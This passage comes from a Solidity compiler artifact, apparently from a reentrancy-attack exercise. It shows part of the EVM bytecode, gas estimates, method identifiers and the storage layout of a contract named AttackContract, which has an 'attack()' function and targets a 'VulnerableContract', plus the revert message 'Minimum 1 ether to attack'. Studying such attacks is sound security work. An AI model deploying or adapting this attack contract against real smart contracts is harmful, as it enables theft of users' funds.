SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x532 PUSH2 0x52D PUSH2 0x528 DUP5 PUSH2 0x4F9 JUMP JUMPDEST PUSH2 0x41A JUMP JUMPDEST PUSH2 0x4F9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x543 DUP3 PUSH2 0x518 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x554 DUP3 PUSH2 0x539 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x564 DUP2 PUSH2 0x54A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x57D PUSH0 DUP4 ADD DUP5 PUSH2 0x55B JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x58D DUP3 PUSH2 0x4F9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x59D DUP2 PUSH2 0x583 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x5B6 PUSH0 DUP4 ADD DUP5 PUSH2 0x594 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x5C9 DUP2 PUSH2 0x411 JUMP JUMPDEST DUP2 EQ PUSH2 0x5D3 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x5E4 DUP2 PUSH2 0x5C0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x5FF JUMPI PUSH2 0x5FE PUSH2 0x5BC JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x60C DUP5 DUP3 DUP6 ADD PUSH2 0x5D6 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4D696E696D756D203120657468657220746F2061747461636B00000000000000 PUSH0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH0 PUSH2 0x649 PUSH1 0x19 DUP4 PUSH2 0x3AE JUMP JUMPDEST SWAP2 POP PUSH2 0x654 DUP3 PUSH2 0x615 JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x676 DUP2 PUSH2 0x63D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x6A0 PUSH2 0x69B PUSH2 0x696 DUP5 PUSH2 0x67D JUMP JUMPDEST PUSH2 0x41A JUMP JUMPDEST PUSH2 0x411 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x6B0 DUP2 PUSH2 0x686 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x6C9 PUSH0 DUP4 ADD DUP5 PUSH2 0x6A7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x27 0xC1 0xCA 0x21 0xE7 0x24 GAS 0xDF STATICCALL CHAINID LOG1 0xBC EXTCODESIZE 0xB5 PUSH23 0xE60480C726F8E2F65E32EEEADD7576FDE864736F6C6343 STOP ADDMOD SHR STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "359400",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"attack()": "infinite",
						"getBalance()": "infinite",
						"vulnerableContract()": "infinite"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"getBalance()": "12065fe0",
					"vulnerableContract()": "144166ae"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 11,
						"contract": "contract/ReentrancyAttacks/AttackContract.sol:AttackContract",
						"label": "vulnerableContract",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(VulnerableContract)197"
					},
					{
						"astId": 13,
						"contract": "contract/ReentrancyAttacks/AttackContract.sol:AttackContract",
						"label": "account",
						"offset": 0,
						"slot": "1",
						"type": "t_address_payable"
					}
				],
				"types": {
					"t_address_payable": {
						"encoding": "inplace",
						"label": "address payable",
						"numberOfBytes": "20"
					},
					"t_contract(VulnerableContract)197": {
						"encoding": "inplace",
						"label": "contract VulnerableContract",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}